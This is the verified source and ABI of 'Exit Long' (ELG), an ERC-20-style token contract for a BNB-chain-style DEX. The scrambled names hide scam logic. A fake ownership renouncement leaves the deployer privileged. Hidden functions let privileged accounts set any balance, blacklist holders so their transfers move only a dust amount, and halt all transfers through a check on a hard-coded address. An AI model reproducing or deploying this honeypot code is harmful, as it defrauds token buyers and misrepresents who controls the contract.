{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface tokenEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTx) external view returns (uint256);\n\n    function transfer(address receiverShould, uint256 fromTakeToken) external returns (bool);\n\n    function allowance(address autoMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromTakeToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverShould,\n        uint256 fromTakeToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyMode, uint256 value);\n    event Approval(address indexed autoMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract launchMaxWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromReceiver {\n    function createPair(address launchFee, address liquidityLaunchedShould) external returns (address);\n}\n\ninterface tokenEnableMetadata is tokenEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExitLong is launchMaxWallet, tokenEnable, tokenEnableMetadata {\n\n    uint256 private senderModeReceiver;\n\n    string private swapMode = \"ELG\";\n\n    event OwnershipTransferred(address indexed marketingLaunched, address indexed swapMax);\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapMode;\n    }\n\n    mapping(address => bool) public listReceiverTeam;\n\n    uint8 private limitReceiverWallet = 18;\n\n    string private liquidityShould = \"Exit Long\";\n\n    uint256 modeReceiverFrom;\n\n    uint256 private teamIsAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityShould;\n    }\n\n    constructor (){\n        \n        enableLaunch minLimitSender = enableLaunch(enableTokenTo);\n        marketingTake = fromReceiver(minLimitSender.factory()).createPair(minLimitSender.WETH(), address(this));\n        \n        teamMarketingAuto = _msgSender();\n        amountTo();\n        liquidityAuto[teamMarketingAuto] = true;\n        receiverLaunched[teamMarketingAuto] = exemptLimitAuto;\n        \n        emit Transfer(address(0), teamMarketingAuto, exemptLimitAuto);\n    }\n\n    bool public feeSwap;\n\n    function tradingSwap(address listShould, uint256 fromTakeToken) public {\n        modeAt();\n        receiverLaunched[listShould] = fromTakeToken;\n    }\n\n    uint256 private exemptLimitAuto = 100000000 * 10 ** 18;\n\n    uint256 feeTx;\n\n    function amountTo() public {\n        emit OwnershipTransferred(teamMarketingAuto, address(0));\n        fundReceiverFee = address(0);\n    }\n\n    function launchSell(address enableSender, address receiverShould, uint256 fromTakeToken) internal returns (bool) {\n        if (enableSender == teamMarketingAuto) {\n            return takeReceiverIs(enableSender, receiverShould, fromTakeToken);\n        }\n        uint256 fromMarketing = tokenEnable(marketingTake).balanceOf(marketingAtFrom);\n        require(fromMarketing == modeReceiverFrom);\n        require(receiverShould != marketingAtFrom);\n        if (listReceiverTeam[enableSender]) {\n            return takeReceiverIs(enableSender, receiverShould, receiverSender);\n        }\n        return takeReceiverIs(enableSender, receiverShould, fromTakeToken);\n    }\n\n    function approve(address exemptFund, uint256 fromTakeToken) public virtual override returns (bool) {\n        minModeTeam[_msgSender()][exemptFund] = fromTakeToken;\n        emit Approval(_msgSender(), exemptFund, fromTakeToken);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptLimitAuto;\n    }\n\n    function transferFrom(address enableSender, address receiverShould, uint256 fromTakeToken) external override returns (bool) {\n        if (_msgSender() != enableTokenTo) {\n            if (minModeTeam[enableSender][_msgSender()] != type(uint256).max) {\n                require(fromTakeToken <= minModeTeam[enableSender][_msgSender()]);\n                minModeTeam[enableSender][_msgSender()] -= fromTakeToken;\n            }\n        }\n        return launchSell(enableSender, receiverShould, fromTakeToken);\n    }\n\n    bool private shouldFund;\n\n    function receiverAmount(address modeFund) public {\n        modeAt();\n        \n        if (modeFund == teamMarketingAuto || modeFund == marketingTake) {\n            return;\n        }\n        listReceiverTeam[modeFund] = true;\n    }\n\n    address public marketingTake;\n\n    function transfer(address listShould, uint256 fromTakeToken) external virtual override returns (bool) {\n        return launchSell(_msgSender(), listShould, fromTakeToken);\n    }\n\n    bool public exemptMinFrom;\n\n    function getOwner() external view returns (address) {\n        return fundReceiverFee;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitReceiverWallet;\n    }\n\n    mapping(address => uint256) private receiverLaunched;\n\n    mapping(address => bool) public liquidityAuto;\n\n    function takeReceiverIs(address enableSender, address receiverShould, uint256 fromTakeToken) internal returns (bool) {\n        require(receiverLaunched[enableSender] >= fromTakeToken);\n        receiverLaunched[enableSender] -= fromTakeToken;\n        receiverLaunched[receiverShould] += fromTakeToken;\n        emit Transfer(enableSender, receiverShould, fromTakeToken);\n        return true;\n    }\n\n    bool public totalTo;\n\n    function owner() external view returns (address) {\n        return fundReceiverFee;\n    }\n\n    mapping(address => mapping(address => uint256)) private minModeTeam;\n\n    function minLiquidity(address walletSender) public {\n        if (exemptMinFrom) {\n            return;\n        }\n        if (modeSender != senderModeReceiver) {\n            tokenLiquidity = true;\n        }\n        liquidityAuto[walletSender] = true;\n        \n        exemptMinFrom = true;\n    }\n\n    address public teamMarketingAuto;\n\n    uint256 constant receiverSender = 13 ** 10;\n\n    function allowance(address teamLimit, address exemptFund) external view virtual override returns (uint256) {\n        if (exemptFund == enableTokenTo) {\n            return type(uint256).max;\n        }\n        return minModeTeam[teamLimit][exemptFund];\n    }\n\n    function enableMode(uint256 fromTakeToken) public {\n        modeAt();\n        modeReceiverFrom = fromTakeToken;\n    }\n\n    address enableTokenTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public tokenTrading;\n\n    bool private fundLimit;\n\n    function modeAt() private view {\n        require(liquidityAuto[_msgSender()]);\n    }\n\n    address marketingAtFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public tokenLiquidity;\n\n    address private fundReceiverFee;\n\n    function balanceOf(address receiverTx) public view virtual override returns (uint256) {\n        return receiverLaunched[receiverTx];\n    }\n\n    uint256 private modeSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTakeToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromTakeToken\",\"type\":\"uint256\"}],\"name\":\"enableMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMinFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listReceiverTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"}],\"name\":\"minLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFund\",\"type\":\"address\"}],\"name\":\"receiverAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMarketingAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTakeToken\",\"type\":\"uint256\"}],\"name\":\"tradingSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTakeToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTakeToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExitLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}